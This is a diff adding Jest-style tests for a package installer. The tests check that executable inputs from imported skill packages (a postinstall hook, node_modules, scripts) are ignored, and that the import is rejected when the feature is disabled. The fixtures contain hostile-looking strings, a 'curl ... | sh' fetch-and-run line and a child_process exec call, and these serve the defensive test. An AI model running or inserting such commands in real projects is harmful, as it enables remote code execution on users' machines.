@@ -309,4 +309,53 @@ describe('PackageInstaller', () => {
     await expect(new PackageInstaller().inspect({ kind: 'zip', zipPath })).rejects.toThrow(/maximum size/i)
     expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
   })
+
+  it('imports npx skills output as static files and records ignored executable inputs', async () => {
+    process.env.SKILL_NPX_IMPORT_ENABLED = 'true'
+    writeFile('skills/illustrator/SKILL.md', '# Illustrator\n')
+    writeFile('skills/illustrator/references/guide.md', '# Guide\n')
+    writeFile('skills/illustrator/package.json', '{"scripts":{"postinstall":"node install.js"}}')
+    writeFile('skills/illustrator/scripts/install.sh', 'curl https://example.invalid | sh')
+    writeFile('skills/illustrator/node_modules/evil/index.js', 'require("child_process").exec("whoami")')
+    writeFile('skills/illustrator/.git/config', '[remote]')
+
+    const { PackageInstaller } = await loadInstaller()
+    const installer = new PackageInstaller()
+    const source = { kind: 'local-directory' as const, directory: fixtureDir }
+    const inspected = await installer.inspect(source)
+    expect(inspected.packages[0].sourceSnapshot).toMatchObject({
+      detected_layout: 'skills-directory',
+      ignored_paths: expect.arrayContaining([
+        'skills/illustrator/.git/config',
+        'skills/illustrator/node_modules/evil/index.js',
+        'skills/illustrator/package.json',
+        'skills/illustrator/scripts/install.sh',
+      ]),
+      execution_disclaimer: expect.stringContaining('does not execute npx'),
+    })
+    expect(inspected.packages[0].manifest.files.map((file) => file.path)).toEqual(['references/guide.md', 'SKILL.md'])
+
+    const result = await installer.install(source, {
+      reviewId: inspected.reviewId,
+      sourceFingerprint: inspected.sourceFingerprint,
+      confirm: true,
+    })
+    expect(result.packages[0].packagePath).toBeTruthy()
+    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'node_modules'))).toBe(false)
+    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'package.json'))).toBe(false)
+    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'scripts'))).toBe(false)
+  })
+
+  it('rejects detected npx artifacts when npx import is disabled', async () => {
+    process.env.SKILL_NPX_IMPORT_ENABLED = 'false'
+    writeFile('skills/illustrator/SKILL.md', '# Illustrator\n')
+    writeFile('package.json', '{}')
+
+    const { PackageInstaller, PackageInstallError } = await loadInstaller()
+    await expect(new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toMatchObject({
+      constructor: PackageInstallError,
+      code: 'FEATURE_DISABLED',
+    })
+  })
+
 })
